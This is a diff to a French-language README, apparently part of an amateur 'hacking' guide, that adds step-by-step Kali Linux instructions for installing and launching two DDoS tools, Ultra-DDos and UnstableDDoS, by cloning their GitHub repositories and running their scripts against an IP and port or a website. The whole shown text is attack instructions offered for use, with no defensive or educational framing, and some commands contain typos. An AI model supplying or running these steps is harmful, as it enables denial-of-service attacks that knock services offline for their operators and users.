@@ -57,8 +57,9 @@ copie colle ton url que tu as noté
 dans mots clé choisis login  
 puis choisis un des lien proposer 
 
-### nouveau hack : attack ddos  
-commande a mettre dans kali linux : 
+### nouveau hack : attack ddos  unstable + ultra ddos (deux terminal linux)
+
+commande a mettre dans kali linux pour ultra ddos et unstable : 
 ````bash
 sudo apt update
 sudo apt upgrade
@@ -66,18 +67,28 @@ sudo apt upgrade
 ensuite :  
 ````bash
 sudo apt installgit python3 python3-pip
+pip3 install --break-system-packages pysocks bs4 scapy-python3
 ````
-cloner le repot:  
+cloner le repot pour ultra ddos:  
 ````bash
 git clone https://github.com/mishakorzik/Ultra-DDos
 ````
-ouvrir et lancer :  
+pour unstable :
+````bash
+git clone https://github.com/iJoshoa/UnstableDDoS
+````
+ouvrir et lancer pour ultra ddos:  
 ````bash
 cd Ultra-DDos
 python2 main.py
 ````
-si un probleme :
+pour unstable :
+````bash
+ cd UNSTABLE.py
+python UNSTABLE.py
+````
+si un probleme pour ulra ddos:
 ````bash
 pip install --break-system-packages user-agent
 ````
-vous pouvez lancer une attack ddos sur une ip avec son port ,sur un site web et inspecter le reseau si une attack a fonctionner sur une ip et une url   
+vous pouvez lancer une attack ddos sur une ip avec son port ,sur un site web  
